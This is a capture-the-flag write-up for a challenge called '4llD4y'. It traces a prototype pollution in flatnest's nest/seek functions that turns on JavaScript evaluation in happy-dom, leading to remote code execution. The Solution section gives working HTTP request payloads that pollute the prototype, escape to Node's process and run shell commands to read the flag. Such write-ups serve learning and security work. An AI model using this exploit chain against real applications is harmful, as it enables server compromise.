#### 4llD4y
- points earned: 50
#### Notes / Intuition
- I found an article online that showed a past vulnerability, CVE-2025-61927, in `happy-dom`.  The vulnerability was an RCE that existed because of the fact that malicious javascript could be executed within the context of the `happy-dom` `Window`.  Per the CVE text, 'Version 20.0.0 patches the issue by changing JavaScript evaluation to be disabled by default'.
	- https://www.endorlabs.com/learn/happier-doms-the-perils-of-running-untrusted-javascript-code-outside-of-a-web-browser
	- https://nvd.nist.gov/vuln/detail/CVE-2025-61927
- If a developer using `happy-dom` creates a `Browser` with javascript enabled, then the application becomes vulnerable to `CVE-2025-61927`.
	```js
	const browser = new Browser({settings: {enableJavaScriptEvaluation: true}});
	```
- There's also a warning on the `happy-dom` repo about this as well.
	```js
	const { Window } = require('happy-dom');
	const window = new Window({ console, settings: { enableJavaScriptEvaluation: true } });
	
	window.document.write(`
	  <script>
	     const process = this.constructor.constructor('return process')();
	  
	     console.log('PID:', process.pid);
	  </script>
	`);
	```
- The challenge code creates the `Window` object without specifying `enableJavaScriptEvaluation` so at first glance it is safe.
	```js
	const window = new Window({ console});
	```
- or is it?  What's up with the `app.post('/config', (req, res) => {}` block?
- The `/config` block doesn't really do anything.  It takes `req.body` and sends it to `nest()`.
- There is a past CVE for `flatnest`, CVE-2023-26135, which is a prototype pollution in the `nest` function.  The last commit to the repo was a solution to this CVE.
	```js
	if (key === "__proto__") continue
	if (key === "constructor" && typeof target[key] == "function") continue
	```
- What's nice about `flatnest`, as it pertains to this challenge, is that there's not a lot of code and it is relatively easy to digest.  It consists of the files `flatten.js`, `nest.js`, and `seek.js` and basically provides a way to flatten or unflatten an object.
	```js
> 	o = { a: 1, b: { c: 2 }}
	{ a: 1, b: { c: 2 } }
> 	flattened = flatten(o)
	{ a: 1, 'b.c': 2 }
> 	nest(flattened)
	{ a: 1, b: { c: 2 } }
	```
- I found the code below(from the `nest` function) to be a little curious because of the way it performs operations on `obj`.
	```js
	var circular = /\[Circular \((.+)\)\]/
	// ... TRUNCATED
	if (typeof obj[key] == "string" && circular.test(obj[key])) {
		var ref = circular.exec(obj[key])[1]
		if (ref == "this")
			obj[key] = nested
		else
			obj[key] = seek(nested, ref)
		}
		insert(nested, key, obj[key])
	}
	```
- This block
	- Iterates the keys in `obj`.
	- If the value at each key is a `string` and that value is something like `[Circular (meow)]`
		- get the value between `[Circular (` and `)`.  In this example, it would be `meow`
		- if that value is 'this' then set `obj[key]` to the current value of `nested`
		- else set `obj[key]` to the return value of `seek()`
	- call `nested()` which is where the fix to the CVE is located
- What happens in `seek()`?
	```js
	var nestedRe = /(\.|\[)/
	var scrub = /]/g
	  
	function seek(obj, path) {
		path = path.replace(scrub, "")
		var pathBits = path.split(nestedRe)
		var len = pathBits.length
		var layer = obj
		for (var i = 0; i < len; i += 2) {
			if (layer == null) return undefined
			var key = pathBits[i]
			layer = layer[key]
		}
		return layer
	}
	```
	- removes any `]` characters in path
	- splits `path` by `.` or `[`
	- with each item that was split
		- do nothing if `obj` is `null`
		- sets `layer` to `layer[key]`
	- returns
- So at this point, since there hasn't been any `__proto__` filter, I'm starting to wonder if there might be a way to pollute the `{}` prototype in the `seek()` function.
- After some tinkering around I came up with the example below.
	```js
	nest({'a': '[Circular (__proto__)]', 'a.b': 'meow' });
	console.log({}.b) // outputs 'meow'
	```
- Tracing this through the code:
	- the `for` loop in the `nest()` function will have 2 iterations, one for each key `a` and `a.b`
	- on the first iteration `seek()` will get called where `obj` is `{}` and `path` is `__proto__`
		- layer is not `null`(is is `{}`) and key is `__proto__`
		- so it ends up returning `({}).__proto__` which is our prototype
		- insert gets called where args `target` is `{}`, `path` is `'a'`, and `value` is a reference to the `({}).__proto__`.
		- All checks for `__proto__` and `constructor` are passed because these keys do not exist.
		- `parent['a']` becomes `value` which is the reference to the `({}).__proto__`.
		- and then `parent['a']`(the prototype) is returned.
	- on the second iteration of the `for` loop in `nest()`
		- `circular.test(obj[key])` fails so execution goes straight to the `insert()` call
		- `target` is a reference to `{ a: ({}).__proto__ }`, `path` is `a.b`, and `value` is `meow`
		- this time, the `for` loop in `insert()` has 2 iterations for keys `a` and `b`
			- the first iteration sets `parent` to `parent['a']` which contains a reference to the `{}` prototype
			- in the second iteration, `type` is null because `pathBits[i + 1]` does not exist
			- `parent['b']` gets set to `'meow'`
			- `since` parent is the `{}` prototype, this is where the pollution happens
- So can I use this to pollute the `{}` prototype with `{ settings: { enableJavaScriptEvaluation: true } }`.  Yes!
	```js
	nest({'a': '[Circular (__proto__)]', 'a.settings': {enableJavaScriptEvaluation: true} });
	console.log({}.settings) // outputs { enableJavaScriptEvaluation: true }
	```
- Circling back to the challenge app, when `Window` is created, a new object is instantiated setting `console` to `console`.  Since I can pollute `{}` with `settings: { enableJavaScriptEvaluation: true }` then this code becomes vulnerable.
```js
const window = new Window({ console});
```

#### Solution
- POST to `/config` to pollute the prototype
	```http
	POST /config HTTP/1.1
	Host: me:3000
	Content-Type: application/json
	
	{"a": "[Circular (__proto__)]", "a.settings": {"enableJavaScriptEvaluation": true} }
	```
- POST to `/render` to trigger the command execution
	```http
	POST /render HTTP/1.1
	Host: me:3000
	Content-Type: application/json
	
	{"html":"<div id='output'></div>  <script>    const p = this.constructor.constructor('return process')();    const b = p.binding('spawn_sync');    const o = b.spawn({        file: '/bin/sh',        args: ['sh','-c','cat /flag_*'],         stdio: [            { type: 'pipe', readable: true, writable: false },            { type: 'pipe', readable: true, writable: true },            { type: 'pipe', readable: true, writable: true }        ]    });    document.querySelector('#output').textContent = o.output[1].toString();  </script>"}
	```
- here's the prettified code used to trigger the command execution and show the flag
	```html
	<div id='output'></div> 
	<script>
		const p = this.constructor.constructor('return process')();
		const b = p.binding('spawn_sync');
		const o = b.spawn({
			file: '/bin/sh',
			args: ['sh','-c','cat /flag_*'],
			stdio: [
				{ type: 'pipe', readable: true, writable: false },
				{ type: 'pipe', readable: true, writable: true },
				{ type: 'pipe', readable: true, writable: true }
			]
		});
		document.querySelector('#output').textContent = o.output[1].toString();
	</script>
	```